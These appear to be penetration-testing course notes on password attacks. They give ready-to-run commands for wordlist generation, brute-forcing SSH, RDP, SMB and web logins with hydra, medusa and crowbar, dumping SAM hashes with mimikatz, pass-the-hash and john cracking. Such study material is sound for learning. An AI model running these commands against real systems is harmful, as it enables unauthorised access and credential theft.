# Password Attacks

## Wordlists

`cewl` generates a custom wordlist from scraping a website. Below we specify `-m 6` for words with a minimum of six characters, and `-w` to write to a custom file:

```bash
cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
wc -l megacorp-cewl.txt
grep Nano megacorp-cewl.txt
```

If it weas discovered that a password policy required two digits at the end, we can mutate wordlists to include this permutation. Edit `/etc/john/john.conf`. The $ appends it to the password in the worldist.

Under the `[List.Rules:Wordlist]` section we can add:
```bash
# Add two numbers to the end of each password
$[0-9]$[0-9]
```

Then run with our generated wordlist to create the additional mutated passwords:  
`john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt`

## Brute Force Wordlists

A pattern such as the below can have a brute force list generated using crunch. For example:  
`[Capital Letter]  [2 x lower case letters]  [2 x special chars]  [3 x numeric]`  

This can then be generated in crunch, also specifying the minimum and maximum length, and the wordlist with `-t`.

`crunch 8 8 -t ,@@^^%%%`  

Where: @ = lower case alpha, , = upper case alpha, % = numeric, ^ = special characters.

`crunch` can also be used to generate a password list based on a character set:  
`crunch 4 6 0123456789ABCDEF -o crunch.txt`

Finally, pre defined character sets such as /usr/share/crunch/charset.lst can be used to generate lists:
```bash
# cat /usr/share/crunch/charset.lst
mixalpha-numeric-all       = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~`[]{}|\:;"'<>,.?/]

crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt
```

# Network Service Attacks

## HTTP htaccess

Medusa usage for htaccess attack:  

`medusa -h 192.168.100.100 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`

Medusa works with a variety of other protocols:  
`medusa -d`  E.g, smb:  
`medusa -h 192.168.141.10 -u admin -P crunch_smb.txt -M smbnt`

## RDP 

Invoke `crowbar` with `-b` for protocol, `-s` for target server, `-u` for username, `-C` for wordlist, and `-n` for number of threads:

```bash
sudo apt install crowbar
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```

RDP does not reliabliy handle multiple threads.

## SSH

Using `hydra` specify `-l` for the username, `-P` for the wordlist, and `procotol://IP` for the target protocol and IP.  

`hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`

## HTTP POST

Get help from hydra:  
`hydra http-form-post -U`  

We then need to look at form and determine the inputs, and find the condition string if a login is unsuccesful.

Using `-l` for username, `-P` for password wordlist, `-vV` for verbose output and `-f` to stop on first succesful test we can use:  
`hydra 192.168.141.10 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`  

# Password Hashes

We can identify a hash with `hashid`.

Training material slightly out of date, new hash type yescrypt:
https://manpages.debian.org/unstable/libcrypt-dev/crypt.5.en.html

Dump passwords with mimikatz.exe:

```
cmd
C:\Tools\password_attacks\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
```

## Passing the Hash

We can use `pth-winexe` to conduct pass the hash attacks.

In this example `-U` specifies the hash, prepended by the username, followed by the UNC format SMB share and the command to be ran:
`pth-winexe -U offsec%61fc5cc76eab45fcf27f8b0c01386132:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.141.10 cmd`

## Password Cracking

With our mimikatz hashes:
```bash
sudo john hash.me --format=NT
# Add a wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hash.me --format=NT
# Use rules for word mangling
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.me --format=NT
# Unshadow Linux based hashes first
unshadow passwd-file.txt shadow-file.txt > unshadow
# Then proceed
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadow
# Note that yescrypt a newer hash type doesn't seem to be picked up by default:
https://security.stackexchange.com/questions/252665/does-john-the-ripper-not-support-yescrypt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt unshadow


